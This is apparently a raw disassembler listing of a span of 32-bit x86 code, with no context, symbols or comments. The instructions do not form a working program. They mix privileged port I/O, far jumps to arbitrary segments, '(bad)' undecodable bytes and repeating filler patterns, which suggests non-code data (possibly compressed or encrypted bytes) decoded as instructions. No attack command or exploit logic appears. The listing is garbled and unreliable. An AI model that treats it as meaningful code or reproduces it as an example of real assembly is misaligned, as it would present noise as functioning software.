  42ef6a:	inc    DWORD PTR [eax]
  42ef6c:	add    BYTE PTR [eax],al
  42ef6e:	mov    ebp,0x174bdefe
  42ef73:	cmp    eax,0xf9f50ab3
  42ef78:	mov    ds:0x5385ffe1,al
  42ef7d:	fcomp  st(2)
  42ef7f:	repz adc DWORD PTR [ebx],ebx
  42ef82:	lds    edi,FWORD PTR [esi-0x49]
  42ef85:	lea    ebp,[eax-0x80]
  42ef88:	test   BYTE PTR [eax-0x4c5ef278],bh
  42ef8e:	pop    es
  42ef8f:	leave  
  42ef90:	ret    
  42ef91:	scas   eax,DWORD PTR es:[edi]
  42ef92:	pusha  
  42ef93:	fwait
  42ef94:	out    dx,al
  42ef95:	rol    ah,cl
  42ef97:	add    edi,DWORD PTR [ebp+eax*1-0x2c]
  42ef9b:	sar    bh,1
  42ef9d:	xchg   esp,eax
  42ef9e:	or     BYTE PTR [esp+eax*8],dl
  42efa1:	pop    ebp
  42efa2:	pop    ebx
  42efa3:	jmp    0x12d6:0xa31e0a86
  42efaa:	and    ebp,DWORD PTR [edx*4-0x3557a221]
  42efb1:	adc    DWORD PTR [edi+0x61c2ffe7],ebx
  42efb7:	popf   
  42efb8:	int3   
  42efb9:	dec    esp
  42efba:	arpl   WORD PTR [ecx-0x65],sp
  42efbd:	jnp    0x42eff9
  42efbf:	pop    edx
  42efc0:	mov    DWORD PTR [edx+ebp*8+0x7ca148ec],edi
  42efc7:	sbb    esp,DWORD PTR [ebx]
  42efc9:	(bad)  
  42efca:	in     eax,0xa1
  42efcc:	imul   esi,edx,0xda94495
  42efd2:	test   BYTE PTR ds:0x6e14729a,bl
  42efd8:	or     BYTE PTR [edx+0x6],bl
  42efdb:	sbb    al,0xf6
  42efdd:	xor    cl,dh
  42efdf:	clc    
  42efe0:	mov    ah,0x40
  42efe2:	xor    bh,bl
  42efe4:	mov    esi,0xf2ef2e38
  42efe9:	lahf   
  42efea:	pusha  
  42efeb:	and    DWORD PTR [edi],ebp
  42efed:	jnp    0x42f013
  42efef:	xchg   ebp,eax
  42eff0:	inc    eax
  42eff1:	std    
  42eff2:	jl     0x42ef76
  42eff4:	cmp    BYTE PTR [edx],bh
  42eff6:	cmp    eax,0x32d4a474
  42effb:	inc    edx
  42effc:	addr16 adc edx,0xffffffae
  42f000:	dec    esp
  42f001:	cmp    eax,0x4a20ea8d
  42f006:	out    dx,al
  42f007:	sub    ebp,ecx
  42f009:	leave  
  42f00a:	es test al,0x80
  42f00d:	in     al,0x32
  42f00f:	cmc    
  42f010:	scas   eax,DWORD PTR es:[edi]
  42f011:	and    BYTE PTR [esi+ebx*2+0x7e],0x6d
  42f016:	daa    
  42f017:	jne    0x42f05f
  42f019:	xchg   esi,eax
  42f01a:	sar    DWORD PTR [edx],cl
  42f01c:	adc    al,0xf
  42f01e:	dec    edx
  42f01f:	xchg   edx,eax
  42f020:	out    0x80,al
  42f022:	fmul   DWORD PTR [edx]
  42f024:	aam    0xac
  42f026:	pop    ebp
  42f027:	call   0x3b9acbe6
  42f02c:	loop   0x42efaf
  42f02e:	fstp   TBYTE PTR [ecx+edi*8+0x4db4cd27]
  42f035:	repnz lds eax,FWORD PTR [edx+ecx*1+0x6e]
  42f03a:	or     DWORD PTR ss:[esi],ebx
  42f03d:	mov    ah,0x87
  42f03f:	push   ds
  42f040:	sar    DWORD PTR [eax+0xe],1
  42f043:	mov    edx,0x6aacbc24
  42f048:	mov    ebx,0x7baa9fc6
  42f04d:	inc    DWORD PTR [esi-0x4f]
  42f050:	icebp  
  42f051:	push   cs
  42f052:	sbb    al,0xed
  42f054:	inc    BYTE PTR [ecx]
  42f056:	inc    ebx
  42f057:	sub    esi,DWORD PTR [ebp-0x79a4bf77]
  42f05d:	fwait
  42f05e:	xlat   BYTE PTR ds:[ebx]
  42f060:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42f062:	(bad)  
  42f064:	lds    esi,FWORD PTR [edi]
  42f066:	js     0x42f08e
  42f068:	xchg   ebp,eax
  42f069:	inc    eax
  42f06a:	add    BYTE PTR [eax+0x1d],dl
	...
  42f0d5:	add    BYTE PTR [edx],dl
  42f0d7:	ds int 0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	mov    DWORD PTR [eax-0x68],ebp
  42f0e5:	mov    BYTE PTR [esi-0x9],al
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	inc    DWORD PTR [eax]
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	lds    ebx,FWORD PTR [edi+edx*1-0x2b]
  42f0f2:	lahf   
  42f0f3:	out    dx,eax
  42f0f4:	pop    edi
  42f0f5:	fwait
  42f0f6:	mov    ds:0x645d5ec4,eax
  42f0fb:	mov    al,0x6c
  42f0fd:	pop    ebx
  42f0fe:	sti    
  42f0ff:	leave  
  42f100:	popf   
  42f101:	iret   
  42f102:	dec    ebp
  42f103:	pop    es
  42f104:	pop    es
  42f105:	popa   
  42f106:	mov    WORD PTR ds:0xc1ff9048,ss
  42f10c:	jecxz  0x42f173
  42f10e:	cmp    esp,edx
  42f110:	into   
  42f111:	xchg   edi,eax
  42f112:	jge    0x42f0b0
  42f114:	imul   ecx,DWORD PTR [ecx+0x1ded9def],0xb
  42f11b:	ins    BYTE PTR es:[edi],dx
  42f11c:	lods   eax,DWORD PTR ds:[esi]
  42f11d:	adc    BYTE PTR [esi],ah
  42f11f:	(bad)  
  42f121:	iret   
  42f122:	jmp    0xb66b:0xde4a22e8
  42f129:	or     ecx,DWORD PTR [esi+0x22]
  42f12c:	je     0x42f16e
  42f12e:	add    BYTE PTR [esi+0x40dfc11e],0x12
  42f135:	imul   ebx,edx,0xffffff91
  42f138:	jecxz  0x42f176
  42f13a:	adc    DWORD PTR [ebx],ecx
  42f13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f13d:	mov    esi,0x197408d4
  42f142:	in     al,0xd8
  42f144:	lahf   
  42f145:	or     BYTE PTR [eax-0x2c628e11],0x4b
  42f14c:	bound  ecx,QWORD PTR [esi-0xcdca146]
  42f152:	call   0x66424503
  42f157:	pop    eax
  42f158:	fucom  st(6)
  42f15a:	jp     0x42f164
  42f15c:	cs ds push es
  42f15f:	inc    ebp
  42f160:	out    0xd0,eax
  42f162:	imul   esi,DWORD PTR [edx+ebp*2+0x1e],0xffffff8b
  42f167:	lea    edi,[ebx]
  42f169:	jne    0x42f10a
  42f16b:	cmp    eax,0xf2a27db1
  42f170:	mov    DWORD PTR [ebx+0x4b3166e1],0xdf423488
  42f17a:	mov    DWORD PTR [edi],ebp
  42f17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f17d:	outs   dx,DWORD PTR ds:[esi]
  42f17e:	jp     0x42f1a9
  42f180:	scas   al,BYTE PTR es:[edi]
  42f181:	push   eax
  42f182:	adc    edi,DWORD PTR [edx+0x7c89de53]
  42f188:	pop    ds
  42f189:	test   eax,0x4665e72e
  42f18e:	push   esp
  42f18f:	dec    ebp
  42f190:	xchg   ebx,eax
  42f191:	pop    ebp
  42f192:	fcomp  DWORD PTR [ebp-0x4d029c2b]
  42f198:	aaa    
  42f199:	jge    0x42f1aa
  42f19b:	jnp    0x42f14a
  42f19d:	es push es
  42f19f:	icebp  
  42f1a0:	mov    DWORD PTR [edi+edx*1-0x3b],esi
  42f1a4:	cli    
  42f1a5:	pop    edx
  42f1a6:	pop    ds
  42f1a7:	dec    edx
  42f1a8:	clc    
  42f1a9:	sbb    DWORD PTR [ecx+edi*4+0x26],0x3e
  42f1ae:	mov    ds:0xf6c729e6,al
  42f1b3:	out    0x86,al
  42f1b5:	pop    esi
  42f1b6:	dec    eax
  42f1b7:	push   eax
  42f1b8:	js     0x42f238
  42f1ba:	mov    dl,0x74
  42f1bc:	outs   dx,BYTE PTR ds:[esi]
  42f1bd:	xchg   esp,eax
  42f1be:	push   cs
  42f1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f1c0:	ins    BYTE PTR es:[edi],dx
  42f1c1:	dec    esp
  42f1c2:	gs retfw 
  42f1c5:	dec    esi
  42f1c6:	jp     0x42f198
  42f1c8:	setl   BYTE PTR [esi-0x48]
  42f1cc:	inc    esp
  42f1cd:	jns    0x42f168
  42f1cf:	jns    0x42f229
  42f1d1:	aad    0x33
  42f1d3:	sub    eax,0x31d68337
  42f1d8:	push   ebp
  42f1d9:	das    
  42f1da:	push   ecx
  42f1db:	inc    ecx
  42f1dc:	xor    al,0x38
  42f1de:	rcl    al,1
  42f1e0:	mov    WORD PTR [eax-0x58],gs
  42f1e3:	pop    edx
  42f1e4:	add    dh,cl
  42f1e6:	retf   0x609d
  42f1e9:	enter  0x5b12,0xf4
	...
  42f255:	add    BYTE PTR [edx+0x26],bl
  42f258:	jecxz  0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	mov    cl,BYTE PTR [esi-0x45]
  42f265:	cmp    eax,0x1f845
  42f26a:	inc    DWORD PTR [eax]
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	or     ah,al
  42f270:	pop    ds
  42f271:	xchg   esp,eax
  42f272:	xchg   esi,eax
  42f273:	jns    0x42f278
  42f275:	aaa    
  42f276:	adc    al,0x5a
  42f278:	dec    esp
  42f279:	sbb    esp,DWORD PTR [ecx+0x57b966f0]
  42f27f:	mov    esi,0x51bd58e2
  42f284:	cmc    
  42f285:	lea    esp,[ebx+edi*1+0x793d83f7]
  42f28c:	mov    DWORD PTR [esi+eax*4+0xc],ebp
  42f290:	inc    edx
  42f291:	adc    DWORD PTR [edx+0x242f67a6],esi
  42f297:	xchg   eax,edx
  42f299:	pop    edx
  42f29a:	jp     0x42f2d7
  42f29c:	loop   0x42f279
  42f29e:	stos   DWORD PTR es:[edi],eax
  42f29f:	push   edi
  42f2a0:	in     al,0x2a
  42f2a2:	je     0x42f317
  42f2a4:	lea    ebp,[esi-0x27]
  42f2a7:	mov    ds:0x2cff2af5,eax
  42f2ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2ad:	call   0x6c8:0x8d0c1dfe
  42f2b4:	cmc    
  42f2b5:	out    0xa,eax
  42f2b7:	mov    DWORD PTR ds:0x52bfc9f0,eax
  42f2bd:	jmp    0x201f:0xa22e8c26
  42f2c4:	scas   al,BYTE PTR es:[edi]
  42f2c5:	test   BYTE PTR ds:0x80cc35b5,al
  42f2cb:	dec    ebp
  42f2cc:	push   ds
  42f2cd:	adc    al,0x74
  42f2cf:	pop    es
  42f2d0:	mov    eax,ds:0x3d8382e3
  42f2d5:	mov    dl,0x36
  42f2d7:	ss dec esp
  42f2d9:	das    
  42f2da:	push   ss
  42f2db:	pop    ebx
  42f2dc:	std    
  42f2dd:	xchg   edx,eax
  42f2de:	xchg   ah,bl
  42f2e0:	js     0x42f27d
  42f2e2:	fbld   TBYTE PTR [ecx+0x57]
  42f2e5:	xor    dl,BYTE PTR [eax+0x3]
  42f2e8:	sbb    BYTE PTR [esi+0x13],bl
  42f2eb:	inc    ecx
  42f2ec:	fiadd  DWORD PTR [edi+0x12]
  42f2ef:	mov    ds:0x87a63f90,al
  42f2f4:	sbb    BYTE PTR [esi],0xbb
  42f2f7:	cmp    DWORD PTR [edx],ebx
  42f2f9:	push   cs
  42f2fa:	pop    ss
  42f2fb:	push   ss
  42f2fc:	mov    bh,0xfa
  42f2fe:	js     0x42f2b6
  42f300:	push   ss
  42f301:	xchg   edx,eax
  42f302:	(bad)  
  42f303:	cmp    BYTE PTR [eax],bl
  42f305:	dec    ebp
  42f306:	inc    eax
  42f307:	ret    0x9027
  42f30a:	push   ds
  42f30b:	mov    dh,0x98
  42f30d:	mov    dh,0x9c
  42f30f:	fimul  DWORD PTR [edi]
  42f311:	sbb    eax,0x6f6feebe
  42f316:	adc    al,dl
  42f318:	sbb    DWORD PTR [ebx-0x318e35ad],edx
  42f31e:	add    esp,DWORD PTR [esi]
  42f320:	jnp    0x42f2d4
  42f322:	jl     0x42f365
  42f324:	nop
  42f325:	in     eax,0xf
  42f327:	hlt    
  42f328:	fmul   DWORD PTR [ecx+0x4d]
  42f32b:	mov    eax,0x7fdbd86c
  42f330:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42f332:	and    BYTE PTR [ebx+eax*8+0x30],ch
  42f336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f337:	fimul  DWORD PTR [ebx+0x1]
  42f33a:	dec    ecx
  42f33b:	xchg   esi,eax
  42f33c:	mov    ebx,0x9389027c
  42f341:	aaa    
  42f342:	pop    ebp
  42f343:	xor    ah,ch
  42f345:	mov    edi,0xbbe2ae54
  42f34a:	sbb    al,0xb8
  42f34c:	adc    ebp,DWORD PTR [esi]
  42f34e:	jl     0x42f3b8
  42f350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f351:	in     eax,0x55
  42f353:	xchg   ecx,eax
  42f354:	adc    ebx,DWORD PTR [esi]
  42f356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f357:	xchg   edi,eax
  42f358:	push   eax
  42f359:	jbe    0x42f3c3
  42f35b:	xchg   esi,eax
  42f35c:	inc    esi
  42f35d:	pop    ecx
  42f35e:	inc    edi
  42f35f:	jp     0x42f312
  42f361:	loopne 0x42f3af
  42f363:	xor    eax,0xaa8fb5f5
  42f368:	mov    bh,0x5d
  42f36a:	lods   al,BYTE PTR ds:[esi]
  42f36b:	sar    DWORD PTR [edi],cl
	...
  42f3d5:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	sub    DWORD PTR [edx],ecx
  42f3e4:	fst    QWORD PTR [edx+0x44]
  42f3e7:	stc    
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	inc    DWORD PTR [eax]
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	call   0x8477959d
  42f3f3:	fcomp  QWORD PTR [esi+0x2be5035d]
  42f3f9:	inc    ebp
  42f3fa:	mov    al,0xcd
  42f3fc:	mov    dl,0x48
  42f3fe:	aad    0xf4
  42f400:	test   DWORD PTR [edx-0x2f44b2f8],0xe8fb8e8f
  42f40a:	sbb    eax,0x7cda250c
  42f40f:	xor    eax,0xde3f8526
  42f414:	xor    ah,bl
  42f416:	mov    bl,0xa4
  42f418:	retf   
  42f419:	jg     0x42f416
  42f41b:	aaa    
  42f41c:	repz pop eax
  42f41e:	data16 std 
  42f420:	adc    cl,dl
  42f422:	cmp    DWORD PTR [ecx-0x3c87349f],esi
  42f428:	in     eax,dx
  42f429:	xor    DWORD PTR [eax+ebx*2],edi
  42f42c:	add    ebp,DWORD PTR [ecx-0x6e389e85]
  42f432:	data16 jg 0x42f3ee
  42f435:	jo     0x42f412
  42f437:	aas    
  42f438:	pop    DWORD PTR es:[esi-0x328b96c4]
  42f43f:	mov    ebp,edi
  42f441:	cld    
  42f442:	push   ds
  42f443:	fdivr  DWORD PTR [edx+0x415b98c]
  42f449:	rcl    BYTE PTR [ecx],0x20
  42f44c:	or     DWORD PTR [eax-0x12eede5],edx
  42f452:	xchg   edi,eax
  42f453:	pop    ebx
  42f454:	sub    al,0x6e
  42f456:	jmp    0x42f3df
  42f458:	(bad)  
  42f459:	js     0x42f446
  42f45b:	repz and BYTE PTR [eax+0x45],bh
  42f45f:	mov    esp,0x78438e09
  42f464:	adc    bl,BYTE PTR [eax-0x64]
  42f467:	jmpw   0x9e46
  42f46b:	retf   
  42f46c:	les    ecx,FWORD PTR [ebx-0x56]
  42f46f:	inc    esp
  42f470:	xchg   esi,eax
  42f471:	push   esi
  42f472:	addr16 jmp 0xba1a:0xabbeb18d
  42f47a:	mov    esp,0x160b03b9
  42f47f:	mov    bh,0x22
  42f481:	inc    esi
  42f482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f483:	mov    ebx,0xe8eaa74d
  42f488:	loope  0x42f4e9
  42f48a:	adc    ebx,DWORD PTR [eax]
  42f48c:	mov    ah,0x74
  42f48e:	push   0x1191f13d
  42f493:	fcom   DWORD PTR [edi-0x6bc11de9]
  42f499:	fldenv [ecx+ebp*8-0x2fd80fde]
  42f4a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f4a1:	or     bh,dl
  42f4a3:	pop    esi
  42f4a4:	add    DWORD PTR [edx-0x3c],esi
  42f4a7:	or     dh,BYTE PTR [esi-0x62]
  42f4aa:	jns    0x42f435
  42f4ac:	jbe    0x42f4b2
  42f4ae:	daa    
  42f4af:	adc    DWORD PTR [edx+0x5b5b397f],ecx
  42f4b5:	bound  eax,QWORD PTR [esp+ebp*8]
  42f4b8:	dec    eax
  42f4b9:	lea    esi,[eax-0x2b]
  42f4bc:	ds xor eax,0x4210efa4
  42f4c2:	xchg   ebp,eax
  42f4c3:	div    ebx
  42f4c5:	xlat   BYTE PTR ds:[ebx]
  42f4c6:	sti    
  42f4c7:	fld    DWORD PTR [eax]
  42f4c9:	rol    edi,cl
  42f4cb:	dec    ebx
  42f4cc:	jbe    0x42f547
  42f4ce:	add    ch,0x99
  42f4d1:	and    eax,0x34f193f3
  42f4d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f4d7:	and    ebx,esp
  42f4d9:	adc    DWORD PTR ds:0xfe5dde5f,ebx
  42f4df:	sti    
  42f4e0:	sbb    ebx,DWORD PTR [ebp+0x3e]
  42f4e3:	daa    
  42f4e4:	std    
  42f4e5:	mov    ds:0xf4219239,eax
  42f4ea:	adc    BYTE PTR [ecx],al
  42f4ec:	mov    DWORD PTR [eax],0x0
	...
  42f556:	aaa    
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	in     eax,dx
  42f563:	push   ss
  42f564:	pop    ebx
  42f565:	inc    bx
  42f567:	cli    
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	inc    DWORD PTR [eax]
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	bound  esp,QWORD PTR [ebx-0x52b8f142]
  42f574:	cli    
  42f575:	daa    
  42f576:	push   esi
  42f577:	push   esi
  42f578:	fwait
  42f579:	mov    bl,BYTE PTR [edx-0x5694665b]
  42f57f:	les    ecx,FWORD PTR [edx-0x28]
  42f582:	push   edi
  42f583:	or     DWORD PTR [esi+ebx*8+0x41],0x43
  42f588:	pop    ss
  42f589:	scas   eax,DWORD PTR es:[edi]
  42f58a:	jge    0x42f57f
  42f58c:	pop    edi
  42f58d:	int    0xcc
  42f58f:	jg     0x42f5a6
  42f591:	pop    es
  42f592:	xchg   esp,eax
  42f593:	lds    eax,FWORD PTR [edi+ebx*8-0x1b]
  42f597:	pop    edx
  42f598:	jne    0x42f548
  42f59a:	mov    eax,0xf1b9cc1e
  42f59f:	mov    edi,fs
  42f5a1:	adc    DWORD PTR [esi-0x32],esi
  42f5a4:	and    esp,esp
  42f5a6:	aas    
  42f5a7:	clc    
  42f5a8:	jmp    0xfeb9:0x8d592243
  42f5af:	adc    cl,BYTE PTR [ecx+ebp*2]
  42f5b2:	pop    ebp
  42f5b3:	xor    eax,DWORD PTR [edi-0x3c]
  42f5b6:	retf   0x41e
  42f5b9:	idiv   DWORD PTR [esi]
  42f5bb:	push   0x65173a3d
  42f5c0:	mov    gs,eax
  42f5c2:	mov    ch,0x83
  42f5c4:	push   esp
  42f5c5:	mov    ebx,0x2342e58c
  42f5ca:	popa   
  42f5cb:	jne    0x42f63d
  42f5cd:	and    DWORD PTR [ecx+0x58678088],edx
  42f5d3:	add    eax,0xc8b74d5c
  42f5d8:	clc    
  42f5d9:	inc    esp
  42f5da:	test   DWORD PTR [edx],eax
  42f5dc:	outs   dx,DWORD PTR ds:[esi]
  42f5dd:	sub    al,0xe7
  42f5df:	mov    esi,DWORD PTR [edx]
  42f5e1:	out    0x4,eax
  42f5e3:	mov    esi,0x6b2dfc9c
  42f5e8:	mov    esp,DWORD PTR [ebx]
  42f5ea:	sbb    al,0xb3
  42f5ec:	icebp  
  42f5ed:	jnp    0x42f57a
  42f5ef:	fsubr  DWORD PTR [edi-0x5ac354ef]
  42f5f5:	and    esp,0x9c8814ce
  42f5fb:	lahf   
  42f5fc:	loope  0x42f5eb
  42f5fe:	test   DWORD PTR [ebx],0x8110015c
  42f604:	sub    al,0x3b
  42f606:	jns    0x42f5ca
  42f608:	(bad)  
  42f60a:	inc    ebp
  42f60b:	enter  0x440a,0x5d
  42f60f:	fucomi st,st(7)
  42f611:	adc    al,0x29
  42f613:	mov    esp,0x6a52f842
  42f618:	mov    al,0xaa
  42f61a:	add    eax,DWORD PTR ds:0x76575e34
  42f620:	shl    BYTE PTR [edx+0x196a1f45],1
  42f626:	adc    BYTE PTR [edx+0xefba22e],bl
  42f62c:	pop    ebx
  42f62d:	cwde   
  42f62e:	sbb    al,0x6d
  42f630:	cmp    BYTE PTR [ebp+eax*1-0x65677af2],al
  42f637:	xchg   edx,eax
  42f638:	jns    0x42f5db
  42f63a:	mov    ecx,0x82966ef6
  42f63f:	(bad)  
  42f640:	sbb    bh,BYTE PTR [ebx]
  42f642:	pop    ecx
  42f644:	test   DWORD PTR [ebp+0x6c],eax
  42f647:	cwde   
  42f648:	and    esp,DWORD PTR [esi]
  42f64a:	lods   al,BYTE PTR ds:[esi]
  42f64b:	push   esi
  42f64c:	nop
  42f64d:	hlt    
  42f64e:	add    bl,BYTE PTR [edi+0x7d]
  42f651:	dec    esp
  42f652:	ret    0xfdaf
  42f655:	sbb    BYTE PTR [esp+esi*1+0x21],bh
  42f659:	lar    ebx,WORD PTR [edi-0x5cc1d015]
  42f660:	dec    edx
  42f661:	jno    0x42f68b
  42f663:	inc    edx
  42f664:	ins    DWORD PTR es:[edi],dx
  42f665:	outs   dx,BYTE PTR ds:[esi]
  42f666:	and    cl,BYTE PTR [ebx-0x3c]
  42f669:	test   BYTE PTR [esi+0xc76a],0x0
	...
  42f6d4:	add    BYTE PTR [eax],al
  42f6d6:	ds push esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	mov    edi,0x424b365c
  42f6e7:	sti    
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	inc    DWORD PTR [eax]
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	imul   ebp,esi,0x161af53c
  42f6f4:	or     eax,0x8f9a3366
  42f6f9:	call   0xf580aaf1
  42f6fe:	out    dx,eax
  42f6ff:	pop    edi
  42f700:	push   edx
  42f701:	pop    ebp
  42f702:	mov    ds:0x383c3360,eax
  42f707:	outs   dx,DWORD PTR ds:[esi]
  42f708:	fist   WORD PTR [ebp-0x68]
  42f70b:	retf   0xddb3
  42f70e:	jb     0x42f6ac
  42f710:	inc    esp
  42f711:	or     al,0xbc
  42f713:	out    dx,eax
  42f714:	adc    BYTE PTR [ebp-0x4506a3dc],bh
  42f71a:	hlt    
  42f71b:	stos   BYTE PTR es:[edi],al
  42f71c:	dec    edi
  42f71d:	sub    edi,0xa0be48d3
  42f723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f724:	dec    DWORD PTR [ecx]
  42f726:	mov    cl,0xf8
  42f728:	inc    ebp
  42f729:	xchg   ecx,eax
  42f72a:	lock scas al,BYTE PTR es:[edi]
  42f72c:	jne    0x42f760
  42f72e:	push   0xfffffff5
  42f730:	inc    ebx
  42f731:	inc    esp
  42f732:	rcr    ch,cl
  42f734:	into   
  42f735:	sahf   
  42f736:	hlt    
  42f737:	mov    esp,esp
  42f739:	les    ebx,FWORD PTR ds:0xd275b569
  42f73f:	fisubr WORD PTR [edx+0x2e]
  42f742:	mov    ebp,0xdd8de845
  42f747:	adc    eax,0xcf9514a2
  42f74c:	mov    ah,0x7a
  42f74e:	vpcmpgtb ymm3,ymm3,YMMWORD PTR [ebx-0x29]
  42f753:	repnz (bad) 
  42f755:	jnp    0x42f761
  42f757:	stos   BYTE PTR es:[edi],al
  42f758:	pop    ss
  42f759:	sar    DWORD PTR gs:[esi-0x7f18b34f],cl
  42f760:	pop    edx
  42f761:	mov    es,ebp
  42f763:	mov    ds:0x23cd2279,al
  42f768:	mov    edi,0xad32a8da
  42f76d:	lea    esp,[ebx-0x683e43bb]
  42f773:	bound  eax,QWORD PTR [ecx+0x74]
  42f776:	pop    es
  42f777:	nop
  42f778:	pop    eax
  42f779:	push   es
  42f77a:	cmp    ah,BYTE PTR [edi-0x8c7cf1a]
  42f780:	add    eax,0xabed19fc
  42f785:	or     bl,BYTE PTR [edx+0x786cd038]
  42f78b:	pop    esp
  42f78c:	(bad)  
  42f78d:	xor    ecx,DWORD PTR [edi-0x23]
  42f790:	fstp   DWORD PTR [edx+ebp*4-0x16]
  42f794:	mov    cl,BYTE PTR [ecx+ecx*1+0x1f]
  42f798:	xchg   BYTE PTR [edi],dl
  42f79a:	int3   
  42f79b:	and    al,0x4
  42f79d:	loopne 0x42f76f
  42f79f:	lods   al,BYTE PTR ds:[esi]
  42f7a0:	push   ebp
  42f7a1:	cdq    
  42f7a2:	loopne 0x42f798
  42f7a4:	iret   
  42f7a5:	scas   eax,DWORD PTR es:[edi]
  42f7a6:	sub    al,0xd6
  42f7a8:	inc    edx
  42f7a9:	push   eax
  42f7aa:	lods   al,BYTE PTR ds:[esi]
  42f7ab:	mov    ebx,0xaa45e7ad
  42f7b0:	cmp    cl,BYTE PTR [ecx-0x1612ffa3]
  42f7b6:	mov    ebp,0x1d00531f
  42f7bb:	or     DWORD PTR [ebp+0x0],eax
  42f7be:	jo     0x42f7d8
  42f7c0:	fld    DWORD PTR [esp+edx*1-0xa]
  42f7c4:	bound  ebp,QWORD PTR [ebp+0x1f]
  42f7c7:	push   ebx
  42f7c8:	mov    edi,eax
  42f7ca:	xor    esi,DWORD PTR [ebp+0x18]
  42f7cd:	mov    BYTE PTR [edi+0x55937705],ch
  42f7d3:	sbb    eax,0x1960c60a
  42f7d8:	sub    BYTE PTR [ecx],0x56
  42f7db:	fnsave [edx]
  42f7dd:	shl    DWORD PTR [ecx-0x56cc6568],cl
  42f7e3:	inc    esp
  42f7e4:	add    DWORD PTR [eax+0xd],eax
  42f7e7:	xor    DWORD PTR [esi],esp
  42f7e9:	push   esi
  42f7ea:	adc    eax,0xb3b6
	...
  42f853:	add    BYTE PTR [eax],al
  42f855:	add    BYTE PTR [ecx-0x5f],dh
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0xb158d7ad
  42f866:	inc    ecx
  42f867:	cld    
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	inc    DWORD PTR [eax]
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	mov    eax,0x79df9219
  42f873:	out    dx,eax
  42f874:	dec    ebx
  42f875:	add    bl,BYTE PTR [esi]
  42f877:	xchg   esp,eax
  42f878:	pop    ebp
  42f879:	loope  0x42f8a2
  42f87b:	dec    edx
  42f87c:	ins    BYTE PTR es:[edi],dx
  42f87d:	in     eax,dx
  42f87e:	or     DWORD PTR [esi-0x43443842],edi
  42f884:	fcomp  QWORD PTR [esi+eiz*1]
  42f887:	mov    ebx,0xd005b091
  42f88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f88d:	sar    DWORD PTR [ebx-0x44b61f1d],0x18
  42f894:	(bad)  
  42f895:	clc    
  42f896:	cli    
  42f897:	mov    ch,0x5f
  42f899:	scas   eax,DWORD PTR es:[edi]
  42f89a:	pop    ds
  42f89b:	pop    esp
  42f89c:	outs   dx,DWORD PTR ds:[esi]
  42f89d:	cs iret 
  42f89f:	sub    al,0x2b
  42f8a1:	(bad)  
  42f8a2:	std    
  42f8a3:	(bad)  
  42f8a4:	repnz leave 
  42f8a6:	iret   
  42f8a7:	test   eax,0x30f42f9b
  42f8ac:	mov    edx,0xd84f6443
  42f8b1:	or     al,0x86
  42f8b3:	jmp    0x246d:0x77e3b2a3
  42f8ba:	rol    dh,1
  42f8bc:	add    al,0xd4
  42f8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f8bf:	idiv   BYTE PTR [ecx+0x10]
  42f8c2:	mov    ah,0x39
  42f8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8c5:	pop    esp
  42f8c6:	outs   dx,DWORD PTR ds:[esi]
  42f8c7:	cs sub eax,0x61efe853
  42f8cd:	sbb    eax,DWORD PTR [edi-0x60]
  42f8d0:	out    dx,al
  42f8d1:	fsub   QWORD PTR [esp+ebx*2-0x58]
  42f8d5:	es daa 
  42f8d7:	sub    bh,BYTE PTR [esi]
  42f8d9:	adc    al,al
  42f8db:	leave  
  42f8dc:	pop    ss
  42f8dd:	sbb    eax,0xe6407f1a
  42f8e2:	ins    DWORD PTR es:[edi],dx
  42f8e3:	mov    ebp,0x83841a8e
  42f8e8:	mov    esi,0xb6b22786
  42f8ed:	push   edx
  42f8ee:	mov    dl,cl
  42f8f0:	int    0x1e
  42f8f2:	dec    ebx
  42f8f3:	and    al,0x5a
  42f8f5:	and    esp,DWORD PTR [esi+esi*4+0x67]
  42f8f9:	jmp    0x85b2d891
  42f8fe:	push   ebp
  42f8ff:	inc    esi
  42f900:	add    ebp,DWORD PTR [eax]
